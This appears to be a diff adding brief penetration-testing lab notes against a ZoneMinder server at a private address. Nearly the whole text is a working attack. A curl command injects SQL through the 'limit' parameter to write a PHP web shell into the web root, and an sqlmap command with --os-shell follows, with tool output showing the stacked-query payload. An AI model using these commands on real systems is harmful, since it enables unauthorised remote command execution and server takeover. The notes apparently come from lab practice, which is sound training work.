@@ -1,0 +1,25 @@
+https://www.exploit-db.com/exploits/17593
+
+Foothold:
+
+curl -X POST http://192.168.222.52/zm/index.php --data 'view=request&request=log&task=query&limit=100;SELECT "<?php echo system($_GET['cmd']); ?>" into DUMPFILE "/usr/share/zoneminder/www/cmd1.php"#&minTime=5'
+
+Priv Esc:
+
+Many vectors but no gcc lol...
+
+
+Instant priv esc is use sqlmap
+
+sqlmap http://192.168.222.52/zm/index.php -data='view=request&request=log&task=query&limit=100&minTime=5' --os-shell
+
+[22:22:26] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('ZMSESSID=9moi4iutstc...c5ols2psq0;zmCSS=classic;zmSkin=classic'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: limit (POST)
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5
+---
+
